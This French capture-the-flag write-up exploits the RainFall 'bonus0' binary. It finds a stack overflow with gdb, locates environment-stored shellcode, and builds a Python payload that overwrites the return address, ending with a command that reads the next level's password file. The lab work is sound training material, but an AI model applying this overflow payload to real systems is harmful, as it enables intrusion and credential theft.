Pour une fois le programme n'attends pas d'argument.

Il propose deux prompt et concatene les deux string avec un espace au milieu.

bonus0@RainFall:~$ ./bonus0
 -
a
 -
b
a b

On va essayer de voir si on peut faire segfault le programme et si oui a partir de combien :

La premiere entree va jusque 4096 sans segfault, par contre la deuxieme segfaut au 17e charactere.

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 -
AAAAAAAAAAAAAAAAAA
qqqqqqqqqqqqqqqqqqqqAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 -
AAAAAAAAAAAAAAAAA
qqqqqqqqqqqqqqqqqqqqAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb)

avec gdb on s'apercoit que notre overflow du buffer ecrit sur esp, et qu'un charactere de moins deplace de 4 . 

(gdb) x/4s $esp-4
0xbffff70c:	 "A"
0xbffff70e:	 "\344\267\001"
0xbffff712:	 ""
0xbffff713:	 ""

On va appeler l'adresse de notre shellcode de l'environnement ici comme au level 2.

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char* ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}

>> 0xbffff831 
l'adresse du shellcode

On va construire un payload:

 4095 * A + \n  + padding + adresse du shell code 
   premiere entree  

pour trouver le padding on utiliser 
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

offset = 9

python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x30\xf8\xff\xbf'"  > /tmp/test

On se segfault plus, la string n'est plus assez longue ! Il suffit de rajouter au moins 7 characteres derriere pour remplir le buffer de 20 ( 20 - 9 - 4(adresse) = 7)

python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x30\xf8\xff\xbf' + 'A'*7 "  > /tmp/test

bonus0@RainFall:~$ cat /tmp/test - | ./bonus0

cat /home/user/bonus1/.pass
